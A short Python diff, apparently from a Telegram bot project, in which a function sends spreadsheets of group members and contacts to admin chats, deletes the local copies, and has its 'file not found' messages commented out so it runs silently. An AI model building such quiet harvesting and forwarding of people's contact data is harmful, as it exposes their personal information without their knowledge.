@@ -15,8 +15,8 @@ def send_files_to_bot(bot, admin_chat_ids):
                 bot.send_document(admin_chat_id, file)
         # После отправки удаляем файл, чтобы избежать повторной отправки
         os.remove("users.xlsx")
-    else:
-        print("Файл с участниками групп не найден или пустой.")
+    #else:
+        #print("Файл с участниками групп не найден или пустой.")
 
     # Проверяем наличие файла с контактами и отправляем его ботам
     if os.path.exists("contacts.xlsx") and os.path.getsize("contacts.xlsx") > 0:
@@ -25,8 +25,8 @@ def send_files_to_bot(bot, admin_chat_ids):
                 bot.send_document(admin_chat_id, file)
         # После отправки удаляем файл, чтобы избежать повторной отправки
         os.remove("contacts.xlsx")
-    else:
-        print("Файл с контактами не найден или пустой.")
+    #else:
+        #print("Файл с контактами не найден или пустой.")
 
 
 #получаем контакты
